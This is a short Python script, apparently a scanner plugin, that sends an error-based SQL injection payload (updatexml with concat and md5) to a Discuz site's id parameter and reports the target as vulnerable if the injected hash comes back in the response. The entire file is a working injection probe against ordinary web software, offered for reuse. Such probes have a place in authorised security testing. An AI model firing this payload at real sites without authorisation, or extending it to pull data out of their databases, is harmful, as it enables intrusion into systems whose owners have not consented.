#!/usr/bin/env python

import requests

class Exploit:
    def __init__(self,target):
        self.target = target
        self.name = 'discuz注入漏洞'
        self.type = 'discuz'


    def Attack(self):
        vulurl = '{}/discuz/1.php?id=1 and updatexml(1,concat(1,md5(1),1),1)'.format(self.target)
        vulget = requests.get(vulurl,timeout=5)
        print(vulget.url)
        vulcontent = vulget.text
        if 'c4ca4238a0b923820dcc509a6f75849b' in vulcontent:
            print('{}可能存在discuz漏洞'.format(self.target))


def main(target):
    d = Exploit(target)
    d.Attack()
